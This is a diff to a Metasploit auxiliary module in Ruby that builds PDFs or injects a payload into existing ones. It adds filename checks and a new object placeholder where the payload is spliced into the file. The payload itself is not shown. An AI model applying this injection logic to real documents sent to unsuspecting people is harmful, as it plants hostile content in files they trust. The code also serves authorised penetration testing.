@@ -38,10 +38,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    if datastore['PDFINJECT']!= ""
+    if datastore['PDFINJECT']!=nil and datastore['PDFINJECT'].chars.last(3).join == "pdf"
         injectpdf
     else
-        if datastore['FILENAME']!= ""
+        if datastore['FILENAME']!=nil and datastore['FILENAME'].chars.last(3).join == "pdf"
           createpdf
         else
           print_error "FILENAME is empty, please enter FILENAME and rerun module"
@@ -57,8 +57,11 @@ class MetasploitModule < Msf::Auxiliary
       #Read in contents of file
       content = File.read(datastore['PDFINJECT'])
 
-      #Check for place holder
-      if content.index("/Contents 4 0 R") != nil
+      #Check for place holder - below ..should.. cover most scenarios.
+      if content.index("/Contents 2 0 R") != nil
+        #If place holder exists create new file content
+        newdata = content[0..(content.index('/Contents 2 0 R')+14)]+inject_payload+content[(content.index('/Contents 2 0 R')+15)..-1]
+      elsif content.index("/Contents 4 0 R") != nil
         #If place holder exists create new file content
         newdata = content[0..(content.index('/Contents 4 0 R')+14)]+inject_payload+content[(content.index('/Contents 4 0 R')+15)..-1]
       elsif content.index("/Contents 6 0 R") != nil
